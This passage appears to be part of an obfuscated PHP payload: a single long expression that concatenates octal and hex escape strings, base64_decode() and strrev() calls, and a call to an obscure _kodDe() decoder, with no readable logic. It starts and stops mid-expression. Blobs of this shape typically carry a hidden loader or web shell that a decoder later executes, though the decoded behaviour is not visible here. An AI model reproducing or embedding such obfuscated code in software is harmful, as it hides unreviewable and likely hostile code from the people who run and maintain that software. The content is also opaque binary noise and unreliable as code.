0\157"."\x4f\x45\x0\x50\x3a\xc2\x8e\xd1\xb5\x1\x38\x31\xd4\x82\x35\xc8\x1c\x79\x20\x84\xc8\xc8\x5\xfa\xbb\x9a\x7d\x10\x5c\x9\x5\x10\xc3\x5b\x2a\x30\x83\x3f\x6a\x69\xa8\xf6\xad\xef\x3b\xb6\x2f\x18"."\242\306\225\230\170\351\13\210\56\251\321\325\350\214\115\245\74\226\241\52\361\157\3\265\243\121\302\27\335\265\64\260\10\176\200\23\133\4\344\51\4\27\67\363\305\214\36\267".base64_decode('vgv9bU+vj6K/cfQTT6PlMngGtCXjsRXR9fgfkVDPJ5LaUHkLxLrWo38Rglkf6/JX')."\xb6\x2c\x9a\x5e\x15\x8d\xd2\xc\xec\x1b\x7e\x45\x56\x84\x70\x60\xa8\x92\x27\x2f\x6c\xa4\x0\xc9\xc2\x68\x1\xaa\x56\xd5\x3a\x32\x99\xc1\xfe\x19\xf5\xaa\x1a\x76\x7a\x0\x5e\xb8\x47\x85\xba\xda"."\143\32\153\341\14\211\244\132\4\366\365\0\104\45\54\20\223\2\57\40\160\377\124\20\156\117\46\172\272\245\160\107\144\145\254\253\235\205\302\323\331\327\164\250\132\151\215\245"."\320\24\265\60\140\24\156\263\344\60\20\234\204\54\222\251\136\17\110\267\42\314\216\2\22\311\216\231\1\212\231\275\273\154\131\117\54\336\52\33\303\343\214\160\240\20\254\16".base64_decode('Z8o01jkWJmbxLICnnH0TcGMBMgcsQCeAhch0sQBxz8UCZKAsgLmTaBdLQxwj4vYY')."\33\230\327\106\271\65\347\302\354\200\344\171\1\343\340\20\225\232\141\247\33\210\213\323\270\154\323\47\30\45\62\52\111\14\100\325\14\25\311\250\74\114\243\20\265\111\42\321"."\157\337\332\45\204\32\136\313\0\223\132\56\273\151\303\55\170\132\1\13\107\324\112\214\230\225\112\355\60\263\16\42\21\124\55\111\52\115\16\152\71\102\310\240\250\10\33\304"."\xbd\x42\x94\x83\xd5\x2b\x89\x20\x98\x6\xbd\x2c\x14\xc7\x4b\x6b\x39\x67\x4\xde\x20\x2\xf0\xb\x3d\x3a\x80\xfe\xf4\x41\x90\x89\x30\xc0\x54\xa7\x36\x0\x87\x2c\x33\xef\xf0\x72\xc7\x7d\x7d\x35"."\x53\xcd\x16\x64\x60\x73\x6\xc1\x1a\x1a\x64\xa5\xc\x7e\xe6\x65\xf2\xd8\x83\x87\xea\x16\x99\x8\x9c\x30\x67\x42\xd8\x4c\x5\xd6\x22\xdc\x9a\x4c\x74\x53\xa\x44\x89\xb5\x29\xd4\x3f\x84\x52\x4b".base64_decode('Rdy1QFq1JKN4d9BcLK2u1iOcWlyrgLF4vbdUrKs1ulqpNbLjqqapUFhBe5FVpFTU').strrev('É(¤dãÇ`t)b“LE(SÎS'."\0".''."\r".'Ì3ÓÄfUÈ¥Æ…¹~1x2)o\'${…} jÄ')."\160\60\41\33\120\270\103\6\34\211\231\17\52\364\204\212\130\2\255\210\46\105\127\247\223\21\34\111\250\317\375\366\105\177\10\102\301\334\221\135\324\250\265\52\241\331\102\153"."\101\110\260\326\103\42\122\342\21\23\211\0\101\344\310\223\306\304\123\210\244\200\116\263\54\107\130\1\124\67\15\165\47\143\235\221\344\32\230\62\301\3\300\16\264\12\36\233"."\x65\x11\x30\x9c\x1e\xc9\x6a\xbe\xb\xf5\x5a\xb6\xa2\xa7\x6b\xcc\x31\x2c\xe2\x67\x19\x86\x45\xbd\x81\xd\x80\x57\x1e\x8\x1e\xea\x4d\x51\xe5\x46\xd1\x4c\x88\x52\xc7\x8c\x8b\x3\xec\x83\x39\xa7"."\x20\x46\x58\x4c\x6e\x55\x44\x28\x87\x87\xc4\xaa\x1\xec\xc3\xaa\xc8\xa9\xb2\x19\x99\x70\xf7\x88\xf\x49\xbc\xc8\xc\xdb\xb7\x45\x7a\xe2\x72\xc\x4c\x95\xb2\x22\xba\xe6\x33\xf6\x8\xeb\x69\xb5"."\75\302\322\230\70\206\357\66\30\117\335\34\30\37\365\227\121\67\23\361\244\145\323\61\6\115\356\154\16\172\5\147\153\117\72\241\242\363\43\31\305\330\34\106\304\247\125\352"."\xaf\xc4\x77\xcb\x8b\x2\xd5\xe0\xc\xdc\x77\xe6\x67\xc\x8d\xe5\xa9\x36\x34\x5e\x9e\x4b\x9e\xa2\x5d\xed\xb1\xae\x68\x73\xe7\x44\x2c\x15\xe9\x54\x58\xc7\x41\xb6\x86\x5d\xcc\xcd\x87\x7a\x62\x9"."\x35\x8e\x68\x62\x55\x16\x9f\xc5\x12\x20\xf2\xd\xd\xc8\xce\x52\x54\xe1\x73\x25\xa4\x9\x95\x73\xd7\x2e\x4b\x2e\xf\xd\x8b\xa8\x77\x77\x72\x4b\x10\xa2\x8f\x8e\x0\x22\x22\x7c\x2d\x70\xb1\x34".base64_decode('SSsP4NLycQXlfW4CDasJp+DMlEpZKLKrnsb9+t1ytFA1Fze57OYYnUOeAj2SrwRc')."\130\141\15\222\273\34\323\333\75\164\136\26\124\354\255\4\261\203\252\56\106\123\324\35\207\337\350\22\346\207\175\272\171\341\52\102\366\322\330\272\214\315\134\331\164\123\172\1"."\144\354\255\3\104\121\137\330\327\11\33\46\111\201\237\134\217\210\345\240\376\62\175\5\241\246\30\37\257\224\113\104\306\205\133\106\174\63\41\352\354\147\54\274\30\344\244\301"."\x4e\x36\xff\xbd\x1e\xef\xa4\x69\x75\xeb\x76\xd1\x20\x57\x30\xab\x84\xc9\x10\x4f\xd7\x65\x0\xa8\x36\xc1\xc1\x46\xa9\x5\xc9\x48\x12\x7\x61\x21\xf1\x1d\xa3\x64\x6d\x52\x36\x51\xbf\x82\xb2\xfd".base64_decode('ElpYEilZTDCnkjQ0DxRWuNWWOwgx7NdmKSHhCofUiWmXoHBNkdVkU1HJGfFR8oqT').base64_decode('pROAlzNkPxUh4aGSw/JSPuHYhBouxjEdnFOlvnTz/BnuipjOhjTNJIJ+kt2nNIlO')."\164\240\236\132\366\204\4\3\122\154\47\363\336\4\376\61\343\114\247\14\233\174\350\56\370\50\363\40\217\130\2\312\206\164\154\77\105\255\131\260\265\33\57\110\375\163\175\176".strrev('•­5#€†WÓ8I'."\n".'D´øçÚ¹ˆÅFHâêLóç,‰´ÈÈ¹j½ûèEÉ¡').strrev('•hC¯bÂ\'^Ÿ"ä…±øÄÂdĞD\\'."\n".'€R²÷´œ0bŒ:j»¨„1€²CÏ')."\61\5\12\160\6\46\116\352\10\375\131\123\314\6\121\307\1\352\262\272\313\235\60\141\154\306\254\46\161\237\45\323\351\42\307\176\143\222\327\103\155\124\307\326\151\114\332\121"."\241\307\2\103\251\34\34\164\21\337\112\245\22\75\111\166\165\202\303\130\144\244\46\243\55\153\370\55\6\217\155\213\254\364\307\304\260\310\57\322\136\65\232\13\242\160\74\341".base64_decode('+NRkAkvsovE2X4FUB3dS6Y1T47GuFVUTEN3QKRWhkbF0tNMf560hFY0kmXdTHF4W').base64_decode('T7RIybFE5UxwwoRHUnkfjQyfUNe3jrAsTYhzya7HgoGg2j+jfknfhvq6vvCS0HQu')."\317\242\350\112\262\315\235\42\332\141\207\110\223\77\2\237\77\54\222\26\203\120\70\24\202\106\370\107\270\57\314\75\175\261\3\2\74\7\247\250\117\44\117\57\174\316\102\230"."\25\176\310\357\24\123\305\326\276\52\337\117\370\252\123\115\255\111\361\231\247\140\130\55\335\3\153\64\233\254\211\340\313\214\376\166\313\131\261\362\113\325\214\36\140\365\130\73".base64_decode('y1EhwxL7QGzYrJUpYxdMYvaFbTSKCnmqQKh6WHDXsN9SbF+a6BSEY7YFEYvtHbHl')."\x2b\xe2\x9d\x5d\x89\xee\xe3\x92\xa9\x74\xcf\xca\x55\xab\xd7\x1c\xf\x33\xcd\xc0\x21\xa7\x4\x99\x7\x35\x70\xb8\x19\x1e\xd5\xec\xf0\x28\x73\x19\xbd\x12\xd3\xfa\xba\x13\x96\x69\x28\x1e\x89\xc6".base64_decode('iFAdQ1RhKgLgqRgvhKsn0drCRdNtnCJHt60PWJY7RerKzs+uGBJ7+5x+Bn/hrD4K')."\237\102\333\314\21\34\16\220\17\101\331\165\65\6\125\231\242\313\16\370\316\171\210\20\172\216\22\65\40\42\211\41\251\360\343\152\2\305\63\301\156\73\210\373\262\26\213\67".base64_decode('M5OpBa4JFoPZvnQ79sfZdzyHDcOWHGJmLDNrSJ4btAwj9sqZYe4AAZ8UTnDMYNB3')."\xc\x67\x13\x41\x3b\x4a\xd5\x32\x94\x6d\x96\x34\x3\x47\x82\x98\x6b\xa\x6a\x85\x41\xb\x11\x7a\x4c\x9b\x7c\x24\xa8\xd\x7b\xd2\x85\x2f\xda\x92\x55\x30\x98\x8f\xbc\x91\x20\x6a\x42\x4a\xa3\x99".base64_decode('UeXsvMVaD9w5LQ44PCRvSXIicSUefO51+LABj+ROdFNkEE3KbPA03WaVZctU5utX')."\x50\x68\x98\xaa\x23\xce\x95\x69\x30\xa0\x8\x1f\xf5\x4c\xac\x4a\x79\x95\xa3\x7c\x1b\x94\xb8\xe6\x11\x64\x7b\x46\xf6\xde\xc0\x10\x79\x71\x58\xa8\x8b\x15\x87\xb9\x62\x47\xc6\x43\xc8\x60\x9a\x41"."\204\154\211\126\1\167\361\50\155\331\4\123\315\2\353\326\145\23\111\351\265\13\217\347\14\331\301\276\120\3\6\52\140\125\152\166\260\243\63\322\22\104\307\323\314\71\163\71"."\121\320\227\106\124\1\3\64\155\314\231\315\30\41\32\63\143\256\222\107\53\3\20\124\351\302\366\30\257\73\147\32\111\175\262\146\154\75\213\325\141\30\25\112\143\175\220\105".base64_decode('IwWeoWHq64+pluU13mE8DMB1VdpdXbXd1dXaXe1rd3VluzTKB8FaqdSSx7Dhwcae').base64_decode('qIwcYKdiDqv7yEpDIJGlOsMhlNxKCfIsz++IL75LctL+8VQXgiMjyw5hhyHBgua4').base64_decode('Kz0umz7XfTJ2TdLJmQ9O94YtxwljN5OE2ufKcYkUu3PyjolqKEnCAfB0x70Acx/B')."\xc2\x91\x30\xbd\x2a\xa0\xdf\x51\xee\x7e\x7\x31\x2d\x91\x41\xec\x71\x5\xe1\x3d\x98\x95\xe8\x78\xc9\x72\x74\xd9\x2f\x75\x56\x27\x6e\x4f\xb9\x8b\x1\xc9\xdd\x73\x51\x1b\xc7\x98\x89\xe9\xc\x4a"."\x8e\x9f\x99\x1b\x65\xd9\xe7\x24\x9e\xb0\x60\xd1\xe3\xa8\x7e\x3c\x88\x86\xee\x73\x9d\xec\xe8\xfa\x30\xd3\x6c\x94\x18\x18\x2e\xa4\xe8\xe6\x2e\x91\xfd\xc3\xc1\x3b\x53\x20\x49\x9b\x3b\xc1\xa6\xb7"."\314\301\252\21\101\311\125\7\305\16\222\113\165\324\57\250\32\167\23\366\157\236\314\15\223\160\320\237\343\253\215\72\150\13\37\325\150\55\351\103\10\53\364\11\346\377\331\267".base64_decode('A3wuo/va+zr70vI0ubaWy6FuS15oPX0RHqoB/MjbBWwypvZvDZcpx1Z1jw2JhGMJ')."\333\104\321\56\60\306\311\305\60\171\4\245\12\354\36\207\343\1\172\163\102\73\257\124\226\336\341\221\341\5\223\1\134\1\17\113\72\250\127\161\206\62\210\267\157\170\115\240"."\231\215\10\115\235\271\314\312\302\31\271\256\6\101\142\115\123\315\61\165\350\267\276\46\120\203\11\135\22\306\253\210\43\110\77\152\232\216\251\43\37\365\340\73\147\22\314\237"."\44\207\273\342\6\37\204\163\113\320\324\112\327\116\113\310\154\340\275\77\63\74\63\74\6\370\140\311\10\156\121\74\11\342\77\3\306\125\204\366\330\165\212\52\43\137\100\353"."\60\353\162\112\7\357\11\103\313\235\255\163\30\26\215\164\36\37\24\56\260\27\55\31\57\26\24\340\122\233\153\33\103\15\265\12\173\62\246\271\266\47\335\26\234\137\273\144"."\361\176\213\132\310\45\264\253\167\342\133\144\54\103\241\302\203\305\160\111\264\10\157\57\36\10\173\103\123\225\5\370\53\152\223\226\211\216\72\204\241\212\241\14\114\146\17\307".base64_decode('YsIruam7Y5YNN+yAYGc2zJZhGkDEYVubCKyasFyVDb+nNFE2g1iEEUzJ7hF97yA0')."\170\363\143\41\204\67\277\214\32\63\2\175\24\305\47\175\323\242\111\221\37\72\221\174\76\23\1\27\335\225\114\131\4\342\60\326\144\121\206\127\141\125\240\104\325\213\22\227".strrev('²4ëÄãv2qØ¢8Çxü Ü^¤?Ãcá¦¾ñe«Õ×ã¡Shÿ0ˆˆ:§‹úú').base64_decode('U6WITV21qxkAlWpZespG1t8kUWoIlsuswaqVyvwEy0AGEeP1eSh1Da01J879xL6g')."\121\264\112\327\370\150\363\52\63\147\65\315\131\320\304\254\364\216\145\72\31\345\22\323\272\106\237\314\165\376\121\341\34\303\3\342\171\15\66\66\274\340\322\133\3\236\150\61"."\215\174\207\63\4\342\311\47\172\353\171\270\5\6\112\371\177\351\115\4\42\171\247\73\11\153\52\251\374\345\210\52\230\24\61\163\354\300\200\143\127\62\66\343\13\62\310\76"."\154\236\137\23\133\144\240\60\54\106\62\200\25\314\1\302\207\121\107\55\101\146\221\43\127\26\153\347\313\346\160\263\224\250\270\226\245\24\65\163\2\270\203\151\116\323\64\147".base64_decode('IW6oGavWOygA+Jp7DMbniPDvSL0TQQq9ZwjhB19C+JBKlplJGBEEAkFRKPPnOUrk').base64_decode('G3rbHe9pj3VJylVShNrS2qVGururJshthLFmQmiIXdhkGIQtMoqDSgbbajTX4Nga').base64_decode('xbEzzIdyTRhwKskgeKtFBhSpxUWUHAKZIPmiybWLF4WNxXzihV8o2xKmKKHw0ZjT')."\12\143\365\45\363\130\274\322\262\66\5\211\155\23\136\240\24\145\221\246\320\71\155\256\45\62\365\132\45\217\316\146\256\273\271\330\137\270\213\135\151\55\12\153\162\42\336\145".base64_decode('SYuRwpzBGuUeEKtei0Qkj+vk4Y0WzVxZWQRXHsrISXQlibFMZf4wkSqEBS/pvTfi')."\xd7\x2c\x55\x80\xa2\xa4\x65\x86\x31\x4c\x89\x3\x0\x5a\x82\x84\x6e\xcc\xa4\xd0\x4\xcf\xfb\x11\xae\xa4\x34\x52\xc6\xe6\x62\x44\x4c\x6f\x8b\x47\x6e\xd6\xad\xa3\x15\xe1\x33\x7f\xc3\x86\xca\x38"."\320\73\365\47\105\112\206\77\12\303\213\77\16\63\341\42\16\235\144\336\146\50\254\312\231\104\14\313\103\177\105\231\170\127\273\10\120\246\304\223\330\313\124\274\111\250\257\267"."\66\64\175\303\206\260\301\264\263\230\46\11\53\33\342\271\151\270\57\344\315\217\106\2\123\317\63\102\204\77\47\245\40\227\303\226\333\57\74\135\230\270\161\55\54\5\253\146"."\x35\x37\x2f\xee\xe5\x97\x50\xfd\x2c\x8d\x91\x81\x46\xe3\x7c\xb6\xe8\x93\xf9\x60\x7a\x15\xff\x6c\xe9\x12\x84\x2e\x7\x6d\x8a\x45\x42\x44\x80\x12\xf1\xfa\x58\x5e\x32\xca\x9f\x6f\x91\xf1\xe\xfd".base64_decode('jpRKcjDMAviGomAMhPkep7cWoYywDGNZCIbxxWMVKl8CNj4m0aMIHSK6a8gfj+ri')."\221\374\143\221\223\261\215\222\353\301\116\364\305\306\32\362\274\316\220\66\252\321\54\65\12\160\350\315\65\344\171\201\32\204\215\150\12\240\1\321\225\105\30\355\50\266\136\150"."\256\41\335\165\362\272\216\312\23\304\122\255\21\124\260\106\141\70\261\250\361\31\263\135\13\35\175\334\362\10\36\273\352\111\202\161\106\244\13\156\205\216\76\201\376\36\163\64"."\203\20\362\344\132\101\267\251\352\71\101\62\344\76\62\47\304\133\360\350\126\167\62\221\116\264\260\67\212\252\311\301\146\63\322\325\241\326\164\202\305\141\6\104\134\103\203\345"."\340\304\100\30\142\140\335\355\262\151\162\145\67\114\35\362\23\13\53\317\250\313\123\211\56\366\246\113\232\203\15\66\23\17\51\275\32\273\277\2\55\131\172\41\227\312\227\135".base64_decode('cTrihwrS2JTYgWjJdSN2HIkq6qViy+YGZifCdOiEWRnkrFIHFSGnuY6abnqkH7Tt').base64_decode('gsW8Wc5saGgINjSi/5mWNfOh19TQUJGloaGJ/E8TiEAXFsWbgjY/w1qQYUzXoUNw')."\x10\x14\xd\xb3\xcc\x8\xaa\xde\x16\x6c\x2e\xa6\xe0\xae\xf5\x33\x1a\x82\xf5\x1f\xad\x7\x71\x32\xc9\x10\xc8\x42\x89\xd\x5c\xa8\x90\x8b\x4a\x8\xe9\xfe\x49\xe0\x37\xc0\xb0\xc2\xb2\x7\x72\xf6".strrev('@® Ñè…r¿(!,ƒ³^.MˆXÜ¯lÍENó6~š´peÜ¿ RdÚ´è').base64_decode('PF1DZbzeK3EMOpgzfJw4QpKWYCJN8siJg/JNB0nmBn0kVOB+BnCwi9dEH1OhHhBg')."\xe\xab\x80\x6b\xde\x1a\x53\xc5\x29\x8c\x83\xcb\x79\x88\x4c\x29\x66\x97\x18\x18\x66\x25\xa3\x4b\x3c\xaf\xc\x1f\x4b\xd9\xb9\x84\x49\xa8\x29\x80\xd6\x5\x31\xbe\x1f\x36\xa\x1e\x93\x63\x55\x2a"._kodDe('L74ZMdyAixN8HNwaeCoxsSmDjkmQm3/5XixbDg/4300xk/Kaeeo8G0TanUdONaEUpQ==').base64_decode('7IcrdI9YSFopJj1PfY56EIuJsgiqWdPCXVdKFfiTfGUiVOheUQDiK3OTi4oquXG8').base64_decode('LzdxWtnCffHKniyp1oGk6eLAWwJCzYDVMSpxUqGSbQ2iVXfkSUPx3dWjefbKnFUy').base64_decode('8d7L+eRIfAvC3uQEcBY2zJp4EljKKu4npEjvbpYSWvjLT3Ik5sxkxRKiDuytA7N8').strrev('‚iKW=¦eiã{+ÜHg‚Ç¦Uƒ	€õW°²(Å„Œ	³I¬«~ğ»ªÆ:'."\0".'Ï³ŞŞ')."\350\12\72\173\116\26\120\41\331\124\270\2\242\357\343\233\124\261\21\140\353\66\67\313\305\274\151\257\237\172\36\373\270\200\345\302\323\312\145\201\262\220\34\117\251\52\313\71"."\360\216\356\340\257\230\126\1\104\57\260\125\100\25\241\17\160\5\115\34\25\112\41\134\73\40\262\0\142\362\34\52\222\13\340\150\205\76\355\251\230\72\267\34\367\56\252\134"."\x0\xde\x5f\xb2\x10\x3d\x85\xfd\xe0\xca\x85\x70\x5d\x3d\x3e\x14\xb5\xc2\x83\x11\x79\x5f\x7b\x49\x67\x99\x2e\x9d\x32\x2d\x34\x13\xf4\xfc\xa6\xb1\x7\x15\x28\x3e\x16\x97\xc6\x61\x18\x76\x2f\x1a".base64_decode('Vj8i6sVpAgvSS7ExqxN3Gb6ybH1Gyjqj1KVzQpEqAbSdztuWy7k4nI7gUATiMrmW')."\246\105\202\213\105\73\236\73\105\311\231\70\317\212\316\165\326\272\306\316\172\242\220\106\234\261\113\214\245\57\350\127\337\43\347\262\313\216\126\346\235\135\150\266\341\145\114\111".base64_decode('+k5VWoBCvAgQDLaesWwiV5AcTJhuUh+Ug3GLy1PwnZVepQrs00fa5hjqEadflj0E')."\x49\x4e\xdc\x51\x48\xf2\xd6\x2f\x11\x7e\xc1\x46\x85\x53\x8c\x2a\xad\x99\x6\x66\x48\x9\x24\x7f\x35\xe2\xd1\x27\xe1\x93\xac\x49\x88\x20\x23\x55\x1e\xe0\x17\x2d\x3e\x92\x8e\x19\xa8\x28\x32\xc5"."\304\54\116\160\5\304\131\13\36\201\43\247\241\152\261\63\145\61\62\271\10\151\263\242\10\115\303\104\213\160\171\42\247\70\330\15\177\17\133\266\152\51\125\232\42\111\322\214"."\146\270\23\50\230\35\61\111\220\60\241\63\25\317\140\343\314\40\163\350\45\133\257\60\256\1\360\66\332\13\22\30\140\6\213\241\15\120\220\204\174\42\217\45\135\127\21\67"."\x28\xc2\xf9\x3\xf1\xf8\xc2\xd7\x93\xb8\x86\xe1\x21\x5b\x3a\xbb\x75\xae\x3c\x49\x7c\xa4\xc8\x68\x54\x68\x19\x50\x9d\x4a\x9c\xa1\xa7\x5a\x3a\x9d\x21\x9c\xdc\xea\xd1\x82\xf5\x65\x40\x3b\xc3\x9b"."\xe\xfe\xf8\x45\x67\xa8\x9b\x16\xcb\xa3\xbb\xe4\xab\x4\x5e\x7d\x90\x5f\x1c\x20\xa5\xc4\x38\x84\x2a\x30\x8a\xb2\xa8\xd7\x7f\x69\x62\x84\xb6\x4\xf5\x1e\xc3\x74\x9a\x39\x5e\x12\xd1\x69\x8b\x47".base64_decode('VmpcYKiEKqldLzyEWleP7Xo9cqzOCW59ifWn8KHIdV8dOcBSOXA6ngDVF/OU5lE8')."\327\230\316\114\164\231\274\245\273\243\73\314\243\226\361\355\111\131\165\341\264\252\205\51\145\351\343\72\60\124\143\105\43\243\304\23\355\261\226\110\274\65\226\132\241\14\352\256"."\42\124\103\310\253\35\336\255\114\204\212\164\342\31\124\17\360\7\44\360\147\160\0\121\350\301\54\347\142\34\301\257\110\132\163\322\333\133\336\152\51\374\351\166\105\215\46\266".strrev('ÃyÕNn‡„Fç!ò¼oWòô«”'."\n".'–=IG«	şezÙ.e(†B¹*Ò¢Á”T)¼').base64_decode('NRxDbHxWYkKuPdLaGetSI/F4YpVHu1AIiW3+pkpWfoJFWhmxCLT1Sl9q4IlK9nbv').base64_decode('E1vQ5ZP965XY9Qe8IslfZKBB6YWkkq0Zji5F0Jd9poOhi1YoeN5GLOSkYNl7slZt').base64_decode('SqUNsDjJhV+1DEn86P3/uKtGVrjPMrJMC4PbJdLHGlrkdzRZmxWvQH3ue1IBcWGk')."\22\7\103\354\131\73\213\260\37\100\33\323\270\130\102\245\116\21\105\23\210\61\266\47\112\362\215\135\70\33\346\123\114\77\260\227\300\50\273\46\302\1\301\10\340\354\120\33"."\x6e\x8e\xb2\x87\x88\xeb\xc5\x42\x2e\xc6\x32\x30\x6d\x51\x84\x27\x60\x9e\x3d\x37\xd6\xbe\x97\xb1\xfc\x8a\xb5\x9e\xa7\xe8\x2b\xda\x20\xcf\x32\xd0\xb4\x5e\x3c\x1c\x94\xb3\x5f\xc\xe\x85\xf8\xb3"."\53\242\250\77\245\112\7\120\262\42\144\110\74\203\322\254\64\320\107\332\370\223\32\312\42\146\145\55\32\40\176\275\242\305\222\353\141\235\73\144\15\172\151\155\150\4\241\164"."\x4\x6b\x84\x75\x89\xac\xe2\x44\x45\x84\x47\x70\x14\x67\xfd\xe2\xca\x88\xf8\x41\x11\x33\x67\xc9\xf3\x47\x10\x32\x36\x87\xa0\x4f\x2d\x52\x1e\x3d\x80\x78\x1b\xdd\xad\x7c\x97\x89\x16\xff\x3f\x29"."\x48\x13\x53\x92\x8a\xa6\xb7\x92\xca\xe\x39\xfe\xa3\x4e\x90\x5d\xf8\xc9\xa9\xbc\x35\xe6\x7d\x6f\x11\xc7\xf8\x1f\x99\xf2\x3c\x2f\x25\x6d\x1a\x62\xc\x2c\x3f\x88\xe5\x2d\x14\xa8\x78\xd8\x45\x21"."\17\351\52\10\324\141\25\261\7\51\306\3\222\314\122\323\323\350\117\37\374\262\343\314\337\11\212\250\240\311\172\16\124\55\171\243\220\265\271\162\214\210\350\324\5\143\116\112"."\x61\xfd\x10\x8d\x3d\x18\x4c\x5e\x9f\x6b\x65\x38\x19\xde\x92\xa9\xf6\xf2\x18\xf6\xd1\xe7\x7d\x12\x47\xbc\x34\x24\xce\x4e\xef\xcb\x2b\xfc\x8a\xd7\x11\x9b\xc1\x71\x3d\x6f\xfd\xa4\xad\xb4\x36\x18".base64_decode('oBQZxmoitGxC/pYVZMkoUCITnmX5ei+WMrDn+7IB8tAcRXX+x2qkncbxp1x6sGAN')."\150\205\44\325\51\363\30\317\330\210\233\342\172\242\236\154\64\52\254\225\112\342\2\112\76\62\321\277\36\243\105\110\353\111\167\250\304\364\136\245\367\324\51\1\163\322\325\25".base64_decode('jYRrrLIZo1J/T6wt8XmycjO9sBNmcpAd9bOb3tDBhMlVsltTLoJukx6WD1fesmJt')."\x39\xc0\x28\xb2\x32\x29\x5c\x73\x87\x64\x46\xc\x32\x28\x8b\x14\x1\x1a\x9e\x8d\x8c\x41\x9\x51\xc3\xf4\x29\x3f\x82\x29\x64\xc2\xfd\x33\x62\xa5\x87\x94\xe0\xc9\xc0\x6a\xef\x22\x51\xc8\x27\x3f"."\xad\x7a\x8e\x33\x35\x38\x2c\xe\x77\xd9\x7d\x88\x50\xb7\xf0\xbf\xe6\x57\xf9\x32\x21\x7b\x85\x90\x6d\x1d\x78\x82\xb0\xca\xbb\x82\x53\x3e\x4b\x18\x10\x16\x91\x9f\xf5\xdc\x92\xb0\xdb\xf3\xbe\x43"."\215\307\301\111\3\316\67\124\260\36\176\256\203\117\253\257\100\322\77\311\151\253\122\36\53\356\241\75\217\46\112\243\6\324\126\371\360\242\64\15\322\270\313\166\41\100\256\344"."\3\314\375\136\325\267\33\75\217\77\371\27\264\312\353\217\237\133\41\250\362\22\246\53\353\305\172\115\213\6\154\166\307\351\317\146\170\140\127\265\165\141\357\103\335\233\126\34".base64_decode('EGuK2Zmz5iyQhRtiCcWFIDgtgAtMoFYEUCheMFSYT1V595NEr5Z15dugvhPgf7Zh')."\4\367\100\263\112\72\317\225\157\54\127\314\0\201\123\111\33\110\72\20\175\352\36\26\326\307\160\304\256\243\107\240\170\36\324\333\26\45\37\252\214\103\72\367\304\146\241\317"."\x3b\x5a\x5\xcc\x63\x17\xb1\xac\xdc\xb5\x35\x2f\x43\x59\x8d\x6f\x22\x33\xc1\x98\x34\x83\xbc\x9b\xae\xfb\xfb\x4e\x26\x6\xa4\x29\x22\x59\x62\xac\xe4\x1a\x5d\xcb\x2f\xa\xc2\xc5\xf1\xb9\x48\x24"."\221\11\223\71\240\307\66\340\142\267\111\230\350\177\260\200\214\107\242\354\224\120\366\251\62\362\360\122\206\132\252\74\337\51\351\116\174\106\277\51\165\307\371\301\240\346\6\45".base64_decode('gJTEh7qbIAsMKEKwrd6x+qpHxUQd/QFlqkyVJJ70yqfwEiYRd7g0MwydgutnmEp+')."\xbf\xd4\xcd\xb\xf6\x85\xee\x50\xcf\x6e\x95\x3c\x15\xcb\xd6\x72\xa4\x22\x79\x1b\x54\x56\x2d\x3d\xe2\x28\x4\x41\x44\x72\x4\x83\x80\x3d\x4c\x9c\x9f\x12\x8b\xc9\x48\x3b\xb7\xa2\xd4\x24\x5\x2d"."\257\164\12\317\256\364\100\257\45\177\213\131\307\230\76\301\374\277\242\326\75\334\45\12\267\372\336\153\46\130\311\377\210\63\233\42\202\12\4\226\223\214\161\75\254\14\177\326".strrev('·Êíìe›‰â‹„ºDEÊº¾)ÙÅP:Mm<V‰€À[ÿAFpû\',·ş8ÚÃÎ')."\xf3\x99\x25\xb4\xe3\x7b\xe3\x96\x7a\xd7\xa5\xdf\x8c\xd8\xff\xbf\x7e\xc6\xf1\xff\xd5\xeb\x8d\x73\x1a\x98\xf0\xdd\xf3\x4\x74\x3b\x90\xdc\x8c\xca\x9b\x94\x3c\x78\x53\xc1\xaf\x6f\x1c\xde\x43\x73"."\x5f\x80\x22\xfe\xc0\xb9\x14\xe6\xaa\xbf\xcc\xe3\x19\x73\x84\xa6\xb1\xb\x27\xad\x50\x90\x8e\xd6\xea\x4c\x4a\xc5\xe3\xba\x8\xf8\x86\xf9\x7b\xac\xd5\x2\x7e\x93\x3b\xff\x43\xbb\xbd\xec\x11\x7a"."\362\206\156\177\265\214\2\363\160\136\250\12\34\323\50\106\2\233\225\367\303\170\275\342\136\377\327\22\221\121\221\115\264\212\150\21\346\74\56\314\276\62\230\355\43\36\35\140"."\xbe\x64\xdb\xdc\x44\x89\x31\x88\xf5\x80\xd9\xfb\x97\x32\x74\x44\x2c\xfd\x1\x2b\xc9\x98\xc8\x13\x55\x81\xbf\xd2\x9e\x55\xf0\x44\xca\x13\xc\xab\x86\x4d\x9b\xd9\x2\x7a\x4a\x74\xfa\x1e\xa\xa5".base64_decode('mRx5Nj0i+kp1gcrSfOfLRbCOtVdqxZ97b/C//94YrGyMmjhgwUkSiyqY8Inc4pDr').strrev('Ï;a…óŠ¡iòÅéVå$o‹–7"Ûnüí—%ü8’hËõJö)D¦¤(e*Ó')."\x94\x23\x5e\x4d\x5c\x13\x1a\x16\x71\x82\xcf\x8a\xf6\x74\xd6\x11\x6b\x1d\x80\x58\xc4\x3e\xb4\x59\x62\xed\xa5\xb7\xc1\xf1\x9e\x12\x8e\x2a\xb1\x5b\x31\x22\x31\x94\x4f\x6d\x66\x40\x27\xe9\x9f\x43"."\224\107\256\347\310\357\215\170\113\142\213\2\357\136\132\134\55\133\306\262\35\51\33\217\257\226\27\103\230\54\267\220\323\360\353\315\256\147\55\304\173\6\376\167\14\10\67\117"."\31\164\17\237\16\67\271\162\224\164\321\211\210\355\254\367\141\24\222\110\242\231\117\123\250\101\272\252\363\336\224\162\357\355\25\230\262\154\304\245\144\122\212\271\312\103\277\330".strrev('Tm9èãÚ¾/€G˜b°gDÄÎ¯+Eäf«İ/&¾ò—÷‘	zda<&0È')."\x10\x49\x82\x16\xcf\x66\xdb\xb4\xd1\x2a\x59\xb3\x8c\x1b\xe1\xb1\x28\x86\x67\x25\x44\x96\x64\xc7\x2c\x54\xe0\xf5\x31\xff\x1b\xd1\x21\xd9\xf6\xd9\x93\xb1\x32\x56\xd8\x39\x4b\xe5\xc5\x25\x8a\x18".base64_decode('Jo6rNnyy0bzFZTtqDlQiij5twbWuJL4Hm3UIdSw6FM7eiya9Vts8G18zlIcY0QQ9')."\261\76\116\16\113\122\30\305\340\113\162\344\367\235\275\327\245\262\274\101\2\1\275\20\227\252\223\257\122\247\54\220\252\336\210\200\112\357\24\113\346\356\42\201\35\165\226\147".base64_decode('8iUUyQcGOZNyoqc7/qUlTIgAXxpZJGJcmhbxJtH8uq/3cgH/yGgJZ8xwM3mJM6pM').strrev('¶\\$ÒË€Sì§ªä—	